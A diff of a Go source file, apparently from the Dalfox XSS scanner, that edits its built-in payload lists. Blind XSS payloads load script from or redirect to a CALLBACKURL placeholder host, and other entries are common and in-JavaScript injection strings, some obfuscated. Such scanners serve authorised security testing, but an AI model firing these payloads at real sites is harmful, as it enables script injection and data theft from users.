@@ -20,10 +20,10 @@ func getSSTIPayload() []string {
 // getBlindPayload is return Blind XSS Payload
 func getBlindPayload() []string {
 	payload := []string{
-		"\"'><script src=//CALLBACKURL></script>",
-		"\"'><script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js></script><div ng-app ng-csp><textarea autofocus ng-focus=\"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//CALLBACKURL'\"></textarea></div>",
-		"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+document.location=`//CALLBACKURL`//'>",
-		"\"'><svg onload=\"javascript:eval('d=document; _ = d.createElement(\\'script\\');_.src=\\'//CALLBACKURL\\';d.body.appendChild(_)')\" xmlns=\"http://www.w3.org/2000/svg\"></svg>",
+		"\"'><script src=CALLBACKURL></script>",
+		"\"'><script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js></script><div ng-app ng-csp><textarea autofocus ng-focus=\"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='CALLBACKURL'\"></textarea></div>",
+		"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+document.location=`CALLBACKURL`//'>",
+		"\"'><svg onload=\"javascript:eval('d=document; _ = d.createElement(\\'script\\');_.src=\\'CALLBACKURL\\'%3Bd.body.appendChild(_)')\" xmlns=\"http://www.w3.org/2000/svg\"></svg>",
 	}
 	return payload
 }
@@ -50,7 +50,7 @@ func getCommonPayload() []string {
 		"\"><img/src/onerror=.1|alert`` class=dalfox>",
 		"'><img/src/onerror=.1|alert`` class=dalfox>",
 		"'\"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
-		"</script><svg><script/class=dalfox>alert(45)</script>-%26apos%3B",
+		"</script><svg><script/class=dalfox>alert(45)</script>-%26apos;",
 		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>",
 
 		// not include verify payload
@@ -104,7 +104,7 @@ func getInJsPayload() []string {
 		"\"-confirm`45`-\"",
 		"</script><svg/onload=alert(45)>",
 		"</script><script>alert(45)</script>",
-		"</script><svg><script/class=dalfox>alert(45)-%26apos%3B",
+		"</script><svg><script/class=dalfox>alert(45)-%26apos;",
 		"';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//",
 		"';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//",
 		"';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//",
